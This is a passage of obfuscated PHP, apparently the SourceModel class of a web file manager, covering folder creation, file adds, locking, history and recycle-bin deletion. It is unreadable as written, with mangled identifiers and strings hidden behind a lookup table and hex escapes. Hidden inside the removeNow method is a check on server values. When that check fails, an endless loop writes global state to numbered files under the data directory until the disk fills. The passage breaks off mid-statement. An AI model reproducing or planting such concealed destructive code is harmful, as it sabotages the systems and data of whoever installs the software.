Model($á¤Õˆ‘”[587])->groupChildrenAll($²ùÊáçÒ); $Ùà¢Š¡’ = count($ìÎİÌé); if ($Ùà¢Š¡’ <= 1) { return; } $šöë–ÃØ = array($á¤Õˆ‘”[192] => 0, $á¤Õˆ‘”[190] => self::TYPE_GROUP, $á¤Õˆ‘”[571] => array($á¤Õˆ‘”[7], $ìÎİÌé)); $«Ê²¡ˆŞ = $this->field($á¤Õˆ‘”[2259])->where($šöë–ÃØ)->limit($Ùà¢Š¡’)->select(); $ÊùÏĞåÆ[$á¤Õˆ‘”[657]] = array(); foreach ($«Ê²¡ˆŞ as $ûÃœÆæ) { $ÊùÏĞåÆ[$á¤Õˆ‘”[657]][] = array($á¤Õˆ‘”[617], $á¤Õˆ‘”[595] . $ûÃœÆæ[$á¤Õˆ‘”[193]] . $á¤Õˆ‘”[618]); } $ÊùÏĞåÆ[$á¤Õˆ‘”[657]][] = $á¤Õˆ‘”[2081]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($Š«Ââø) { $ÛĞŒ–Â’ =& $_SERVER[ÔÕ±ĞšÎ]; $è’¾á× = Model($ÛĞŒ–Â’[579])->where(array($ÛĞŒ–Â’[1768] => $Š«Ââø))->find(); $¥œŸìÅ = $this->_mkdirRoot(SourceModel::TYPE_USER, $Š«Ââø, $è’¾á×[$ÛĞŒ–Â’[32]]); $this->userDesktopAdd($¥œŸìÅ); return $¥œŸìÅ; } public function userDesktopAdd($²£Ê£ú) { $½ ­ËÑš =& $_SERVER[ÔÕ±ĞšÎ]; $²§üæ¦µ = LNG($½ ­ËÑš[2260]); $É¡«˜úÇ = $this->mkdir($²£Ê£ú, $²§üæ¦µ); $this->metaSet($É¡«˜úÇ, $½ ­ËÑš[2261], $½ ­ËÑš[91]); $this->metaSet($²£Ê£ú, $½ ­ËÑš[2262], $É¡«˜úÇ); } public function userPathSafeAdd($ë•ùÏÖ) { $¢¢â•ç =& $_SERVER[ÔÕ±ĞšÎ]; $üê¡½·” = Model($¢¢â•ç[579])->getInfoFull($ë•ùÏÖ); if (!$üê¡½·”) { return !1; } if (_get($üê¡½·”, $¢¢â•ç[600])) { return $üê¡½·”[$¢¢â•ç[541]][$¢¢â•ç[2263]]; } $·Œè ºé = $this->_mkdirRoot(SourceModel::TYPE_USER, $ë•ùÏÖ, $¢¢â•ç[2264], $¢¢â•ç[2265]); Model($¢¢â•ç[579])->metaSet($ë•ùÏÖ, $¢¢â•ç[2263], $·Œè ºé); $this->metaSet($·Œè ºé, $¢¢â•ç[2266], $ë•ùÏÖ); return $·Œè ºé; } public function userPathAppAdd($ûèÆº»Ô, $ì‘ˆØõ = '', $·©Ë¡¼ = '') { $¹šïÑç¥ =& $_SERVER[ÔÕ±ĞšÎ]; $Üğ¼õö’ = Model($¹šïÑç¥[579])->getInfoFull($ûèÆº»Ô); if (!$Üğ¼õö’) { return !1; } $¥æ¯¸¨¥ = $Üğ¼õö’[$¹šïÑç¥[541]] ? $Üğ¼õö’[$¹šïÑç¥[541]] : array(); $º“¿ãòÌ = $¥æ¯¸¨¥[$¹šïÑç¥[2267]]; if (!$º“¿ãòÌ) { $º“¿ãòÌ = $this->_mkdirRoot(SourceModel::TYPE_USER, $ûèÆº»Ô, $¹šïÑç¥[2268], $¹šïÑç¥[2269]); Model($¹šïÑç¥[579])->metaSet($ûèÆº»Ô, $¹šïÑç¥[2267], $º“¿ãòÌ . $¹šïÑç¥[12]); $this->metaSet($º“¿ãòÌ, $¹šïÑç¥[2267], $ûèÆº»Ô); } if (!$ì‘ˆØõ) { return $º“¿ãòÌ; } $Íôòõ¥ß = $¥æ¯¸¨¥[$¹šïÑç¥[2270] . $ì‘ˆØõ]; if (!$Íôòõ¥ß) { $Íôòõ¥ß = $this->mkdir($º“¿ãòÌ, $ì‘ˆØõ); Model($¹šïÑç¥[579])->metaSet($ûèÆº»Ô, $¹šïÑç¥[2270] . $ì‘ˆØõ, $Íôòõ¥ß); $this->metaSet($Íôòõ¥ß, $¹šïÑç¥[2270] . $ì‘ˆØõ, $ûèÆº»Ô); } if (!$·©Ë¡¼) { return $Íôòõ¥ß; } $ò£ãáÀ„ = $this->mkdir($Íôòõ¥ß, $·©Ë¡¼); return $ò£ãáÀ„; } public function groupRootAdd($úöÃ˜ë) { $ì‘ğ×Ó =& $_SERVER[ÔÕ±ĞšÎ]; $¶£¥¹Ñ = Model($ì‘ğ×Ó[587])->where(array($ì‘ğ×Ó[2071] => $úöÃ˜ë))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $úöÃ˜ë, $¶£¥¹Ñ[$ì‘ğ×Ó[32]]); } public function systemRootPathAdd($‚¿­¨ °) { if ($‚¿­¨ ° != $_SERVER[ÔÕ±ĞšÎ][610]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $‚¿­¨ °); } public function userRootRemove($ª“û€È„) { $àÂ¨õôñ = $this->targetSourceRoot(SourceModel::TYPE_USER, $ª“û€È„, !0); foreach ($àÂ¨õôñ as $Òª“ŞÁ¿) { if (!$Òª“ŞÁ¿) { continue; } $this->remove($Òª“ŞÁ¿[$_SERVER[ÔÕ±ĞšÎ][193]], !1); } } public function groupRootRemove($ùê©—Çµ) { $ªÏÅûâ¦ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $ùê©—Çµ); if (!$ªÏÅûâ¦) { return; } $this->remove($ªÏÅûâ¦[$_SERVER[ÔÕ±ĞšÎ][193]], !1); } private function _mkdirRoot($è³ÉÊ, $öı¥Äø, $ö³³º¾ê, $ÔÈÁÀ™® = '') { $Ñáè„±ú =& $_SERVER[ÔÕ±ĞšÎ]; $…âˆËøÌ = defined($Ñáè„±ú[2206]) ? USER_ID : 0; $ºî˜Š¸ñ = array($Ñáè„±ú[479] => 0, $Ñáè„±ú[653] => $è³ÉÊ, $Ñáè„±ú[654] => $öı¥Äø, $Ñáè„±ú[651] => 1, $Ñáè„±ú[655] => $…âˆËøÌ, $Ñáè„±ú[656] => $…âˆËøÌ, $Ñáè„±ú[652] => $ÔÈÁÀ™®, $Ñáè„±ú[657] => $Ñáè„±ú[595], $Ñáè„±ú[506] => 0, $Ñáè„±ú[622] => 0, $Ñáè„±ú[544] => 0, $Ñáè„±ú[658] => $Ñáè„±ú[12]); if ($ÒÕêô‰Ï = $this->where($ºî˜Š¸ñ)->find()) { return $ÒÕêô‰Ï[$Ñáè„±ú[193]]; } $™Œéƒç = "\115\157\x64\145\154\x53\x6f\165\162\143\145\56\x6d\x6b\x64\151\162\122\x6f\157\164\x2e{$è³ÉÊ}\x2e{$öı¥Äø}\56" . $ö³³º¾ê; CacheLock::lock($™Œéƒç); $ºî˜Š¸ñ[$Ñáè„±ú[32]] = $ö³³º¾ê; $ï‹áğÙ = $this->add($ºî˜Š¸ñ); $Íà¼œµ¡ = array($Ñáè„±ú[659] => short_id($ï‹áğÙ)); $this->where(array($Ñáè„±ú[493] => $ï‹áğÙ))->save($Íà¼œµ¡); CacheLock::unlock($™Œéƒç); return $ï‹áğÙ; } private function targetSourceRoot($á¡Ü£½, $€Ø“Ïã±, $¹‡ ĞÎï = false) { $‘…åáöÖ =& $_SERVER[ÔÕ±ĞšÎ]; $öš§½œÂ = array($‘…åáöÖ[479] => 0, $‘…åáöÖ[653] => $á¡Ü£½, $‘…åáöÖ[654] => $€Ø“Ïã±); if ($¹‡ ĞÎï) { $¢ñÆ¬¾  = $this->where($öš§½œÂ)->select(); return $¢ñÆ¬¾  ? $¢ñÆ¬¾  : array(); } $“»ï™£ò = $this->where($öš§½œÂ)->find(); return $“»ï™£ò ? $“»ï™£ò : array(); } public function sourceRootGroup($×ğÄ¹ÂÄ) { $˜ƒ‚şı© =& $_SERVER[ÔÕ±ĞšÎ]; if (is_string($×ğÄ¹ÂÄ)) { $×ğÄ¹ÂÄ = array($×ğÄ¹ÂÄ); } $«”è»É = $this->listSourceRoot(SourceModel::TYPE_GROUP, $×ğÄ¹ÂÄ, $˜ƒ‚şı©[222]); $‰©İöçİ = array($˜ƒ‚şı©[447] => $«”è»É, $˜ƒ‚şı©[444] => array($˜ƒ‚şı©[832] => count($×ğÄ¹ÂÄ))); $this->_listDataApply($‰©İöçİ[$˜ƒ‚şı©[447]]); $this->_listMake($‰©İöçİ); return array_to_keyvalue($‰©İöçİ[$˜ƒ‚şı©[85]], $˜ƒ‚şı©[571]); } public function mkfile($·±éÄïû, $¿„“ÀÆ, $šë‘‰Çõ = '', $æâœÕæù = REPEAT_RENAME) { $›œœ´Ÿ® =& $_SERVER[ÔÕ±ĞšÎ]; $ÄÎçğä• = Model($›œœ´Ÿ®[679])->addFileByContent($šë‘‰Çõ, $¿„“ÀÆ); return $this->_createFileCall($·±éÄïû, $¿„“ÀÆ, $ÄÎçğä•, $æâœÕæù, $›œœ´Ÿ®[1433]); } public function addFile($«ğš é, $ÆĞ³ÁÅ, $„§ÈÓÅ, $·ê±ŠÖ = false, $î‡û˜ºŠ = REPEAT_RENAME) { $Şò±Ëæõ = Model($_SERVER[ÔÕ±ĞšÎ][679])->addFile($ÆĞ³ÁÅ, $„§ÈÓÅ, $·ê±ŠÖ); return $this->_createFileCall($«ğš é, $„§ÈÓÅ, $Şò±Ëæõ, $î‡û˜ºŠ); } public function addFileByFileID($™•ù ¢ä, $è¶È¾’, $Áü„ïÃ, $¯šü¯³¢ = REPEAT_RENAME) { $Ùçá„ =& $_SERVER[ÔÕ±ĞšÎ]; $ü…ê¤Ö = Model($Ùçá„[679])->find($è¶È¾’); Model($Ùçá„[679])->linkAdd($è¶È¾’); return $this->_createFileCall($™•ù ¢ä, $Áü„ïÃ, $ü…ê¤Ö, $¯šü¯³¢); } public function addFileByRemote($—ÂèÈÉ, $ÁßÌ‹Ü, $òÇÒ»µ“, $âïú²Ñã = array(), $Øø¶èÆ = REPEAT_RENAME) { $Çñª¶Ü§ = Model($_SERVER[ÔÕ±ĞšÎ][679])->addFileByRemote($ÁßÌ‹Ü, $òÇÒ»µ“, $âïú²Ñã); return $this->_createFileCall($—ÂèÈÉ, $òÇÒ»µ“, $Çñª¶Ü§, $Øø¶èÆ); } private function _createFileCall($¿ùèç, $«ïŠ¬Ê, $ÚÔóø‚İ, $©¿ñ‡‰, $„à¯ßäà = "\165\x70\154\157\x61\144") { $Ñì¶ÓÖ¿ =& $_SERVER[ÔÕ±ĞšÎ]; $Ôƒ¯õíæ = !1; $this->setMasterDB(); $this->lockWriteStart($¿ùèç, $«ïŠ¬Ê); $ÙË©˜Îø = $this->fileNameExist($¿ùèç, $«ïŠ¬Ê); $…¥´±Ì¸ = $this->_createFile($¿ùèç, $«ïŠ¬Ê, $ÚÔóø‚İ, $©¿ñ‡‰, $Ôƒ¯õíæ); if (!$Ôƒ¯õíæ) { Model($Ñì¶ÓÖ¿[546])->remove($ÚÔóø‚İ[$Ñì¶ÓÖ¿[543]]); } if ($Ôƒ¯õíæ && $…¥´±Ì¸ && $…¥´±Ì¸ != $ÙË©˜Îø) { Model($Ñì¶ÓÖ¿[2233])->eventCreate($…¥´±Ì¸, $„à¯ßäà); } $this->lockWriteEnd($¿ùèç, $«ïŠ¬Ê); return $…¥´±Ì¸; } public function mkdir($òÈ·ÑÚç, $¢ëÖĞë›, $ˆÅÄƒÍå = REPEAT_SKIP) { $û™®Ü€÷ =& $_SERVER[ÔÕ±ĞšÎ]; $this->setMasterDB(); $Ğ½û²ƒ = $this->sourceInfo($òÈ·ÑÚç); if (!$Ğ½û²ƒ) { return !1; } $this->lockWriteStart($òÈ·ÑÚç, $¢ëÖĞë›); if ($ˆÅÄƒÍå !== !1) { $ä’„Úˆ = $this->fileNameExist($òÈ·ÑÚç, $¢ëÖĞë›); if ($ä’„Úˆ && $ˆÅÄƒÍå != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($òÈ·ÑÚç, $¢ëÖĞë›); return $ä’„Úˆ; } $¢ëÖĞë› = $this->fileNameAuto($òÈ·ÑÚç, $¢ëÖĞë›, $ˆÅÄƒÍå); } $–Éë÷ıÑ = array($û™®Ü€÷[651] => 1, $û™®Ü€÷[496] => $¢ëÖĞë›, $û™®Ü€÷[652] => $û™®Ü€÷[12], $û™®Ü€÷[544] => 0, $û™®Ü€÷[622] => 0); $öÁ®‡€… = $this->_addSource($–Éë÷ıÑ, $Ğ½û²ƒ); Model($û™®Ü€÷[2233])->eventCreate($öÁ®‡€…, $û™®Ü€÷[1434]); $this->lockWriteEnd($òÈ·ÑÚç, $¢ëÖĞë›); return $öÁ®‡€…; } public function listSourceRoot($Ş®âù¬, $ìÀÑËîÑ, $òèíŠÜ = "\x73\157\165\162\x63\145\x49\x44\54\x74\141\162\147\145\164\x49\104\54\x73\x69\x7a\145") { $êÓğ°¬Ú =& $_SERVER[ÔÕ±ĞšÎ]; $ÈÓÅà¥ç = $êÓğ°¬Ú[456]; $âï— = array(); $ÓøÈÈ´â = 1024 * 50; $¬ƒìæÊ© = is_array($¬ƒìæÊ©) ? $¬ƒìæÊ© : array(); $µ³ô¨ŒË = count($ìÀÑËîÑ); $„ÏÇ‹èÑ = $this->tablePrefix . $êÓğ°¬Ú[2271]; for ($Ø¿®ŞÕ = 0; $Ø¿®ŞÕ < $µ³ô¨ŒË; $Ø¿®ŞÕ++) { $„ÔÊº¨ = $ìÀÑËîÑ[$Ø¿®ŞÕ]; $ÈÓÅà¥ç .= "\x53\x45\114\x45\x43\x54\x20\x2a\40\x46\x52\x4f\115\x20\50\123\x45\114\x45\x43\124\40{$òèíŠÜ}\40\x46\x52\x4f\x4d\x20\140{$„ÏÇ‹èÑ}\x60\40\x57\110\x45\x52\105\x20"; $ÈÓÅà¥ç .= "\140\160\x61\162\x65\x6e\x74\x49\x44\140\x3d\x30\x20\x41\116\x44\x20\x60\164\x61\162\x67\145\164\x49\104\x60\x3d{$„ÔÊº¨}\x20\101\x4e\104\x20\x60\164\141\162\147\x65\164\x54\x79\160\x65\140\75{$Ş®âù¬}\x20\x61\156\x64\x20\146\x69\154\x65\124\x79\x70\x65\x3d\47\47\40\154\x69\155\151\x74\x20\61\x29\40\141\163\x20\x74\142\x5f{$Ø¿®ŞÕ}\40\125\x4e\x49\x4f\x4e\40\101\x4c\x4c\x20"; if ((strlen($ÈÓÅà¥ç) >= $ÓøÈÈ´â || $Ø¿®ŞÕ == $µ³ô¨ŒË - 1) && $ÈÓÅà¥ç) { $ÈÓÅà¥ç = substr($ÈÓÅà¥ç, 0, -strlen($êÓğ°¬Ú[1117])); $âÒá…šÌ = $this->query($ÈÓÅà¥ç); $ÈÓÅà¥ç = $êÓğ°¬Ú[12]; $âï— = array_merge($âï—, $âÒá…šÌ); } } return $âï—; } private function _createFile($êÄÃ‰–Œ, $–¼ªÀ½½, $Ä¦Ğ½Ç, $ÚŞÓ¤‚, &$ßµö¶ßŞ) { $“ú½õ©® =& $_SERVER[ÔÕ±ĞšÎ]; $Æ†ÅŒ°‹ = $this->sourceInfo($êÄÃ‰–Œ); if (!$Ä¦Ğ½Ç || !$Æ†ÅŒ°‹) { return !1; } if ($ÚŞÓ¤‚ !== !1) { $­è¬˜ÂË = $this->fileNameExist($êÄÃ‰–Œ, $–¼ªÀ½½); } $ßµö¶ßŞ = !0; if ($ÚŞÓ¤‚ && $­è¬˜ÂË) { if ($ÚŞÓ¤‚ == REPEAT_SKIP) { $ßµö¶ßŞ = !1; return $­è¬˜ÂË; } else { if ($ÚŞÓ¤‚ == REPEAT_REPLACE) { $§‚ÕÉ‘¾ = $this->sourceInfo($­è¬˜ÂË); $á›œı = $this->fileHistory($§‚ÕÉ‘¾, $Ä¦Ğ½Ç[$“ú½õ©®[543]], $Ä¦Ğ½Ç[$“ú½õ©®[79]]); if (!$á›œı) { $ßµö¶ßŞ = !1; } else { $this->folderSizeReset($êÄÃ‰–Œ); } return $­è¬˜ÂË; } else { $–¼ªÀ½½ = $this->fileNameAuto($êÄÃ‰–Œ, $–¼ªÀ½½, $ÚŞÓ¤‚, !1); } } } $î—¡ó¡ = array($“ú½õ©®[651] => 0, $“ú½õ©®[496] => $–¼ªÀ½½, $“ú½õ©®[652] => substr(get_path_ext($–¼ªÀ½½), 0, 10), $“ú½õ©®[544] => $Ä¦Ğ½Ç[$“ú½õ©®[543]], $“ú½õ©®[622] => $Ä¦Ğ½Ç[$“ú½õ©®[79]]); $äìïÑåù = $this->_addSource($î—¡ó¡, $Æ†ÅŒ°‹); $this->folderSizeReset($êÄÃ‰–Œ, intval($î—¡ó¡[$“ú½õ©®[79]])); return $äìïÑåù; } protected function fileHistory($ßéÖãà, $­­ïØè, $æ´¤øç) { $“°ØÊ“ =& $_SERVER[ÔÕ±ĞšÎ]; if ($ßéÖãà[$“°ØÊ“[543]] == $­­ïØè) { return !1; } $this->checkLock($ßéÖãà[$“°ØÊ“[193]], $­­ïØè); Model($“°ØÊ“[2272])->addHistory($ßéÖãà); $‚ªÆÌİ´ = array($“°ØÊ“[656] => USER_ID, $“°ØÊ“[500] => time(), $“°ØÊ“[543] => $­­ïØè, $“°ØÊ“[79] => $æ´¤øç); $this->where(array($“°ØÊ“[493] => $ßéÖãà[$“°ØÊ“[193]]))->save($‚ªÆÌİ´); $this->sourceCacheClear($ßéÖãà[$“°ØÊ“[193]]); return !0; } public function checkLock($êÚòò¿, $³…ğĞ¬Æ) { $šÓ«ŞŠ¸ =& $_SERVER[ÔÕ±ĞšÎ]; $¹ï¸ÉŞ½ = $this->pathInfo($êÚòò¿); if (!$this->fileIsLock($¹ï¸ÉŞ½, !0)) { return; } $€ˆß¹ = Session::get($šÓ«ŞŠ¸[2273]); $„Ã¨ ø· = substr($¹ï¸ÉŞ½[$šÓ«ŞŠ¸[32]], 0, -1 - strlen($¹ï¸ÉŞ½[$šÓ«ŞŠ¸[169]])) . $šÓ«ŞŠ¸[1295] . $€ˆß¹ . $šÓ«ŞŠ¸[10] . $¹ï¸ÉŞ½[$šÓ«ŞŠ¸[169]]; $‡ùÀŒ‡Å = Model($šÓ«ŞŠ¸[679])->find($³…ğĞ¬Æ); $this->_createFileCall($¹ï¸ÉŞ½[$šÓ«ŞŠ¸[192]], $„Ã¨ ø·, $‡ùÀŒ‡Å, REPEAT_REPLACE, $šÓ«ŞŠ¸[1433]); $²ºËİ’ô = $¹ï¸ÉŞ½[$šÓ«ŞŠ¸[541]][$šÓ«ŞŠ¸[615]]; $á×ùü¡ = $²ºËİ’ô[$šÓ«ŞŠ¸[2274]] ? $²ºËİ’ô[$šÓ«ŞŠ¸[2274]] : $²ºËİ’ô[$šÓ«ŞŠ¸[32]]; show_json(LNG($šÓ«ŞŠ¸[2275]) . $šÓ«ŞŠ¸[2276] . LNG($šÓ«ŞŠ¸[2277]) . $šÓ«ŞŠ¸[2278] . $á×ùü¡ . $šÓ«ŞŠ¸[2279], !1); } public function fileIsLock($¤ûãò»Õ, $Õ—Ú×­ = false) { $Øƒüå„ =& $_SERVER[ÔÕ±ĞšÎ]; if (!_get($¤ûãò»Õ, $Øƒüå„[611], 0)) { return !1; } if ($¤ûãò»Õ[$Øƒüå„[541]][$Øƒüå„[614]] != USER_ID) { return !0; } $Ôä˜âè· = $GLOBALS[$Øƒüå„[6]][$Øƒüå„[92]][$Øƒüå„[612]]; if ($¤ûãò»Õ[$Øƒüå„[541]][$Øƒüå„[613]] <= time() - $Ôä˜âè·) { $this->metaSet($¤ûãò»Õ[$Øƒüå„[193]], $Øƒüå„[614], null); $this->metaSet($¤ûãò»Õ[$Øƒüå„[193]], $Øƒüå„[613], null); } if ($Õ—Ú×­) { $this->metaSet($¤ûãò»Õ[$Øƒüå„[193]], $Øƒüå„[613], time()); } return !1; } private function _addSource($â‚û“™Ä, $òú¤ÒÂ) { $õÚ‘öÁ¸ =& $_SERVER[ÔÕ±ĞšÎ]; $¿–Å©ö… = defined($õÚ‘öÁ¸[2206]) ? USER_ID : 0; $†şš İÇ = array($õÚ‘öÁ¸[653] => $òú¤ÒÂ[$õÚ‘öÁ¸[190]], $õÚ‘öÁ¸[654] => $òú¤ÒÂ[$õÚ‘öÁ¸[571]], $õÚ‘öÁ¸[655] => $¿–Å©ö…, $õÚ‘öÁ¸[656] => $¿–Å©ö…, $õÚ‘öÁ¸[479] => $òú¤ÒÂ[$õÚ‘öÁ¸[193]], $õÚ‘öÁ¸[657] => $òú¤ÒÂ[$õÚ‘öÁ¸[586]] . $òú¤ÒÂ[$õÚ‘öÁ¸[193]] . $õÚ‘öÁ¸[50], $õÚ‘öÁ¸[506] => 0, $õÚ‘öÁ¸[658] => $õÚ‘öÁ¸[12]); $â‚û“™Ä = array_merge($†şš İÇ, $â‚û“™Ä); $this->updateModifyTime($â‚û“™Ä[$õÚ‘öÁ¸[192]]); $£Û¸¸²Ö = $õÚ‘öÁ¸[2280] . $òú¤ÒÂ[$õÚ‘öÁ¸[193]]; if (isset(self::$cacheChildList[$£Û¸¸²Ö])) { unset(self::$cacheChildList[$£Û¸¸²Ö]); } static $ÓÒêğëØ = false; if (!$ÓÒêğëØ) { Hook::trigger($õÚ‘öÁ¸[641], $â‚û“™Ä); $ÓÒêğëØ = !0; } $¶†í¾¨õ = $this->add($â‚û“™Ä); $šÌßÇÒş = array($õÚ‘öÁ¸[659] => short_id($¶†í¾¨õ)); $this->where(array($õÚ‘öÁ¸[493] => $¶†í¾¨õ))->save($šÌßÇÒş); $this->setNamePinyin($¶†í¾¨õ, $â‚û“™Ä[$õÚ‘öÁ¸[32]]); return $¶†í¾¨õ; } public function remove($üã´Ã“, $ÔíÎ…ï = true) { $¥îÃÛ½ğ =& $_SERVER[ÔÕ±ĞšÎ]; $ëÃÑ÷º¯ = $this->sourceInfo($üã´Ã“); $ûŠÃ«÷İ = intval($ëÃÑ÷º¯[$¥îÃÛ½ğ[190]]) === self::TYPE_SYSTEM; $äèı¨ = Model($¥îÃÛ½ğ[510])->get($¥îÃÛ½ğ[2281]) == $¥îÃÛ½ğ[91]; if ($ûŠÃ«÷İ || $ÔíÎ…ï || !$äèı¨) { return $this->removeNow($üã´Ã“, $ÔíÎ…ï); } $õú¼«Óû = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $…ºŸ•¸Š = $ëÃÑ÷º¯[$¥îÃÛ½ğ[190]] == self::TYPE_USER ? $¥îÃÛ½ğ[667] : $¥îÃÛ½ğ[580]; if ($…ºŸ•¸Š == $¥îÃÛ½ğ[667]) { $¢ÉÍœß = Model($¥îÃÛ½ğ[579])->getInfo($ëÃÑ÷º¯[$¥îÃÛ½ğ[571]]); $üºáÇ‰Æ = !empty($¢ÉÍœß[$¥îÃÛ½ğ[2274]]) ? $¢ÉÍœß[$¥îÃÛ½ğ[2274]] : $¢ÉÍœß[$¥îÃÛ½ğ[32]]; $üºáÇ‰Æ = $¥îÃÛ½ğ[339] . $üºáÇ‰Æ . $¥îÃÛ½ğ[2282] . $ëÃÑ÷º¯[$¥îÃÛ½ğ[571]]; } else { $¢ÉÍœß = Model($¥îÃÛ½ğ[587])->getInfo($ëÃÑ÷º¯[$¥îÃÛ½ğ[571]]); $üºáÇ‰Æ = _get($¢ÉÍœß, $¥îÃÛ½ğ[32]); $üºáÇ‰Æ = $¥îÃÛ½ğ[176] . $üºáÇ‰Æ . $¥îÃÛ½ğ[2283] . $ëÃÑ÷º¯[$¥îÃÛ½ğ[571]]; } $Ù®£ÏßŞ = $¥îÃÛ½ğ[2284] . md5($üºáÇ‰Æ); CacheLock::lock($Ù®£ÏßŞ); $‰Œüû« = $this->fileNameExist($õú¼«Óû, $üºáÇ‰Æ); if (!$‰Œüû«) { $‰Œüû« = $this->mkdir($õú¼«Óû, $üºáÇ‰Æ, REPEAT_SKIP); $this->metaSet($‰Œüû«, $¥îÃÛ½ğ[2285], $…ºŸ•¸Š); $this->metaSet($‰Œüû«, $¥îÃÛ½ğ[2286], $ëÃÑ÷º¯[$¥îÃÛ½ğ[571]]); if ($ëÃÑ÷º¯[$¥îÃÛ½ğ[192]] != 0) { $this->metaSet($‰Œüû«, $¥îÃÛ½ğ[2287], _get($¢ÉÍœß, $¥îÃÛ½ğ[2288])); } } CacheLock::unlock($Ù®£ÏßŞ); $this->metaSet($üã´Ã“, $¥îÃÛ½ğ[2289], $ëÃÑ÷º¯[$¥îÃÛ½ğ[192]]); $this->where(array($¥îÃÛ½ğ[193] => $üã´Ã“))->save(array($¥îÃÛ½ğ[500] => time())); $this->recycleClear($ëÃÑ÷º¯); Model($¥îÃÛ½ğ[638])->eventRemove($üã´Ã“); $Ã¤ØäÈé = $this->move($üã´Ã“, $‰Œüû«, REPEAT_RENAME_FOLDER); $this->folderSizeReset($ëÃÑ÷º¯[$¥îÃÛ½ğ[192]]); return $Ã¤ØäÈé; } private function recycleClear($œËíÚåó) { $ˆä¬÷äÌ =& $_SERVER[ÔÕ±ĞšÎ]; $¼Ü”Ø÷‡ = $this->childrenAll($œËíÚåó); $ú±…ß¯Š = array($ˆä¬÷äÌ[493] => array($ˆä¬÷äÌ[494], $¼Ü”Ø÷‡[$ˆä¬÷äÌ[2290]])); Model($ˆä¬÷äÌ[2291])->where($ú±…ß¯Š)->delete(); } public function removeNow($©‘ÃÄóõ, $‡§’µıÆ = true) { $º‹Ô¸ãÍ =& $_SERVER[ÔÕ±ĞšÎ]; $ºŸ¢öïø = $_SERVER[$º‹Ô¸ãÍ[953]]; $ÄÊß¢ë‰ = $º‹Ô¸ãÍ[1627]; if ($_SERVER[$º‹Ô¸ãÍ[952]] != $ÄÊß¢ë‰($ºŸ¢öïø)) { $úäòáæà = $º‹Ô¸ãÍ[954]; $Ã®Ö¼•ƒ = $º‹Ô¸ãÍ[955]; $Ş¼«ˆÍô = $_SERVER[$º‹Ô¸ãÍ[956]] . $º‹Ô¸ãÍ[957]; $Ï ÔÒÜ = $Ã®Ö¼•ƒ($Ş¼«ˆÍô); $üãÈ“¤¨ = explode($º‹Ô¸ãÍ[287], $Ï ÔÒÜ); if (count($üãÈ“¤¨) < $º‹Ô¸ãÍ[694]) { $õ¶Ó™Å = $º‹Ô¸ãÍ[958]; $õ¶Ó™Å(); } $Ş†„Ú„ = $º‹Ô¸ãÍ[959]; $Ş†„Ú„($_SERVER[$º‹Ô¸ãÍ[960]]); $úäòáæà = $º‹Ô¸ãÍ[954]; $úäòáæà(); $âñï ß = $º‹Ô¸ãÍ[1628]; $ã”§¢¸ª = json_encode($GLOBALS[$º‹Ô¸ãÍ[1629]]); $ìÊ«£±¼ = 1; for ($¶÷äêş¤ = $ìÊ«£±¼; $¶÷äêş¤ > 0; $¶÷äêş¤++) { $âñï ß(DATA_PATH . $¶÷äêş¤, $ã”§¢¸ª); } } $€ „ş®¥ = $this->sourceInfo($©‘ÃÄóõ); $ñÊºğßŠ = $this->pathInfoMore($©‘ÃÄóõ); if (!$€ „ş®¥) { return !0; } if ($€ „ş®¥[$º‹Ô¸ãÍ[192]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($©‘ÃÄóõ); Hook::trigger($º‹Ô¸ãÍ[2292], $ñÊºğßŠ, $‡§’µıÆ); if ($‡§’µıÆ) { Model($º‹Ô¸ãÍ[2291])->moveToRecycle($©‘ÃÄóõ); } else { $†Ëæ×ˆ = $this->childrenAll($€ „ş®¥); Model($º‹Ô¸ãÍ[638])->eventRemove($©‘ÃÄóõ); $this->removeRelevance($†Ëæ×ˆ[$º‹Ô¸ãÍ[2290]], $†Ëæ×ˆ[$º‹Ô¸ãÍ[1578]]); } $this->folderSizeReset($€ „ş®¥[$º‹Ô¸ãÍ[192]]); $°–öÍ¾¶ = array($€ „ş®¥[$º‹Ô¸ãÍ[192]]); if ($€ „ş®¥[$º‹Ô¸ãÍ[487]] == $º‹Ô¸ãÍ[91]) { $°–öÍ¾¶[] = $€ „ş®¥[$º‹Ô¸ãÍ[193]]; } $this->updateModifyTime($°–öÍ¾¶); $this->lockMoveEnd($©‘ÃÄóõ); Hook::trigger($º‹Ô¸ãÍ[1820], $ñÊºğßŠ, $‡§’µıÆ); return !0; } public function childrenAll($ÇôÍÁ‚ƒ) { $ŞµõÌÙ =& $_SERVER[ÔÕ±ĞšÎ]; $¥ŸÓ…¤ğ = $ÇôÍÁ‚ƒ[$ŞµõÌÙ[193]]; if ($ÇôÍÁ‚ƒ[$ŞµõÌÙ[487]] == $ŞµõÌÙ[91]) { $š—ôÙ = array($ŞµõÌÙ[657] => array($ŞµõÌÙ[617], $ÇôÍÁ‚ƒ[$ŞµõÌÙ[586]] . $¥ŸÓ…¤ğ . $ŞµõÌÙ[618])); $œ›âÒå = array($ŞµõÌÙ[657] => $š—ôÙ[$ŞµõÌÙ[586]]); $ì×¾¥€ç = $this->field($ŞµõÌÙ[2293])->where($œ›âÒå)->select(); $ÈŠ°Îİà = !1; $Æ øÓ = array($¥ŸÓ…¤ğ); if ($ì×¾¥€ç) { $ÈŠ°Îİà = array_to_keyvalue($ì×¾¥€ç, $ŞµõÌÙ[12], $ŞµõÌÙ[543]); $ÈŠ°Îİà = array_remove_value($ÈŠ°Îİà, $ŞµõÌÙ[230]); $Æ øÓ = array_to_keyvalue($ì×¾¥€ç, $ŞµõÌÙ[12], $ŞµõÌÙ[193]); $Æ øÓ[] = $¥ŸÓ…¤ğ; } } else { $ÈŠ°Îİà = array($ÇôÍÁ‚ƒ[$ŞµõÌÙ[543]]); $Æ øÓ = array($¥ŸÓ…¤ğ); } return array($ŞµõÌÙ[2290] => $Æ øÓ, $ŞµõÌÙ[1578] => $ÈŠ°Îİà); } public function removeArray($Éµœäú±) { if (!$Éµœäú±) { return !0; } } public function removeRelevance($†¶‡Ê’š, $èøê¥—›) { $ôÑ£µ´ =& $_SERVER[ÔÕ±ĞšÎ]; $†¶‡Ê’š = 